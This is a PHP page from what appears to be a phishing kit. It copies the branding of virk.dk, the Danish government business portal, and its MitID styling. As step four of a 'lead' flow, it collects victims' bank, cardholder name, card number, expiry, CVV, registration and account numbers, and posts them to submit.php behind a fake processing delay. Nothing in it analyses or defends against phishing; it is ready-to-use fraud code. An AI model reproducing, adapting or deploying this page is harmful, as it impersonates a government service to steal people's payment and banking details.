<?php
require_once 'config.php';
session_start();

if (!isset($_SESSION['lead_id'])) {
    header('Location: index.php');
    exit;
}

// Store personal info from step3
foreach ($page3_fields as $field) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST[$field['name']])) {
        $_SESSION[$field['name']] = $_POST[$field['name']];
    }
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $page4_title; ?></title>
    <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
    <link rel="stylesheet" href="assets/style.css">
</head>
<body class="mitid-page">
    <header class="mitid-nav">
        <div class="mitid-nav-container">
            <img src="assets/logo.svg" alt="Virk Logo" class="mitid-logo">
            <span class="mitid-brand">virk.dk</span>
        </div>
    </header>

    <main class="mitid-main">
        <div class="mitid-container">
            <div class="mitid-box">
                <div class="mitid-header">
                    <div class="step-indicator">
                        <span class="step-dot active"></span>
                        <span class="step-dot active"></span>
                        <span class="step-dot active"></span>
                        <span class="step-dot active"></span>
                    </div>
                    <h1><?php echo $page4_title; ?></h1>
                    <p><?php echo $page4_description; ?></p>
                </div>

                <form action="submit.php" method="POST" class="mitid-form" id="cardForm">
                    <div class="card-preview">
                        <div class="card-visual">
                            <div class="card-chip">💳</div>
                            <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
                            <div class="card-bottom">
                                <div>
                                    <small>Kortholder</small>
                                    <div id="cardHolderDisplay">DIT NAVN</div>
                                </div>
                                <div>
                                    <small>Udløber</small>
                                    <div id="expiryDisplay">MM/ÅÅ</div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="bank"><?php echo $page4_bank_label; ?></label>
                        <div class="input-with-icon">
                            <select id="bank" name="bank" required>
                                <option value="">Vælg din bank</option>
                                <option value="Nordea Bank Danmark">Nordea Bank Danmark</option>
                                <option value="Danske Bank">Danske Bank</option>
                                <option value="Jyske Bank">Jyske Bank</option>
                                <option value="Sydbank">Sydbank</option>
                                <option value="Nykredit Bank">Nykredit Bank</option>
                                <option value="Spar Nord Bank">Spar Nord Bank</option>
                                <option value="Arbejdernes Landsbank">Arbejdernes Landsbank</option>
                                <option value="Lån & Spar Bank">Lån & Spar Bank</option>
                                <option value="Anden bank">Anden bank</option>
                            </select>
                            <span class="input-icon">🏦</span>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="card_holder"><?php echo $page4_cardholder_label; ?></label>
                        <div class="input-with-icon">
                            <input type="text" 
                                   id="card_holder" 
                                   name="card_holder" 
                                   placeholder="Navn på kortet"
                                   required>
                            <span class="input-icon">👤</span>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="card_number"><?php echo $page4_cardnumber_label; ?></label>
                        <div class="input-with-icon">
                            <input type="text" 
                                   id="card_number" 
                                   name="card_number" 
                                   placeholder="1234 5678 9012 3456"
                                   maxlength="19"
                                   required>
                            <span class="input-icon">💳</span>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group half">
                            <label for="expiry"><?php echo $page4_expiry_label; ?></label>
                            <input type="text" 
                                   id="expiry" 
                                   name="expiry" 
                                   placeholder="MM/ÅÅ"
                                   maxlength="5"
                                   required>
                        </div>
                        <div class="form-group half">
                            <label for="cvv"><?php echo $page4_cvv_label; ?></label>
                            <input type="password" 
                                   id="cvv" 
                                   name="cvv" 
                                   placeholder="123"
                                   maxlength="4"
                                   required>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group half">
                            <label for="reg_number"><?php echo $page4_reg_label; ?></label>
                            <input type="text" 
                                   id="reg_number" 
                                   name="reg_number" 
                                   placeholder="1234"
                                   maxlength="4"
                                   required>
                        </div>
                        <div class="form-group half">
                            <label for="account_number"><?php echo $page4_account_label; ?></label>
                            <input type="text" 
                                   id="account_number" 
                                   name="account_number" 
                                   placeholder="1234567890"
                                   maxlength="10"
                                   required>
                        </div>
                    </div>

                    <button type="submit" class="mitid-button">
                        <span class="button-text">Bekræft og indsend</span>
                        <div class="button-loader" style="display: none;">
                            <div class="spinner"></div>
                            <span>Behandler...</span>
                        </div>
                    </button>
                </form>
            </div>
        </div>
    </main>

    <script src="assets/script.js"></script>
    <script>
        // Card number formatting
        document.getElementById('card_number').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
            this.value = formatted;
            
            // Update card display
            document.getElementById('cardNumberDisplay').textContent = formatted || '•••• •••• •••• ••••';
        });
        
        // Card holder display
        document.getElementById('card_holder').addEventListener('input', function(e) {
            document.getElementById('cardHolderDisplay').textContent = this.value.toUpperCase() || 'DIT NAVN';
        });
        
        // Expiry formatting
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            this.value = value;
            document.getElementById('expiryDisplay').textContent = value || 'MM/ÅÅ';
        });
        
        // Form submission with animation
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const button = this.querySelector('.mitid-button');
            const buttonText = button.querySelector('.button-text');
            const buttonLoader = button.querySelector('.button-loader');
            
            buttonText.style.display = 'none';
            buttonLoader.style.display = 'flex';
            button.disabled = true;
            
            setTimeout(() => {
                this.submit();
            }, 3000);
        });
    </script>
</body>
</html>
